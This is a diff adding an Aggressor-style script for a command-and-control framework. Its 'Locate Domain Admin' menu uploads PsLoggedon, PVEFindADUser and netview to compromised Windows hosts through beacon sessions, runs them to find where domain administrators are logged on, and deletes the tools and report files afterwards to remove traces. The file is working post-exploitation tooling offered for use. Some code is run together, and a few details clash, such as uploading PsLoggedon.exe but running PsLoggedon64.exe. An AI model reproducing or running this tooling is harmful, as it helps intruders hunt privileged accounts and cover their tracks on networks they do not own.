@@ -1,0 +1,33 @@
+menu "Locate Domain Admin" {
+menu "PsLoggedon" {
+item "Upload PsLoggedon" {
+$bid = $1;
+$dialog = dialog("Upload PsLoggedon", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &PsLoggedon);
+dialog_description($dialog, "Microsoft official tool, some functions of this tool require administrator privileges. Project address: https://docs.microsoft.com/zh-cn/sysinternals/downloads/psloggedon");
+drow_text($dialog, "UploadPath", "Upload path: ");
+dbutton_action($dialog, "Upload");
+dialog_show($dialog);
+}
+sub PsLoggedon{
+bcd($bid, $3['UploadPath']);
+bupload($bid, script_resource("/scripts/Locate AD/PsLoggedon.exe"));
+}
+item "Run PsLoggedon"{ bshell($bid, "PsLoggedon64.exe"); } item "DeletePsLoggedon"{ local('$bid'); foreach $bid ($1){ bshell($1, "del /f /s /q PsLoggedon.exe"); } } } item "PVEFindADUser" { bexecute_assembly($1, script_resource("/scripts/Locate AD/PVEFindADUser.exe"),"-current"); bshell($1, "del /f /s /q report.csv"); } menu "netview" { item "upload netview" { $bid = $1; $dialog = dialog("Upload netview", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &netview); dialog_description($dialog, "Most functions do not require administrator privileges. Project address: https://github.com/mubix/netview");
+drow_text($dialog, "UploadPath", "Upload path: ");
+dbutton_action($dialog, "Upload");
+dialog_show($dialog);
+}
+sub netview {
+bcd($bid, $3['UploadPath']);
+bupload($bid, script_resource("/scripts/Locate AD/netview.exe"));
+}
+item "Run netview"{
+$bid = $1['@'];
+$Dialog = dialog("Run netview",%(domain => "xxx.com",bid => $bid),&netview_run);
+drow_text($Dialog, "domain", "domain: ");
+dbutton_action($Dialog, "Run");
+dialog_show($Dialog);
+}
+sub netview_run{
+local('$Name');
+$Name = $3['domain']; bshell($bid, "netview.exe $+ $Name"); } item "delete netview"{ local('$bid'); foreach $bid ($1){ bshell($1, "del /f /s /q netview.exe"); } } } }
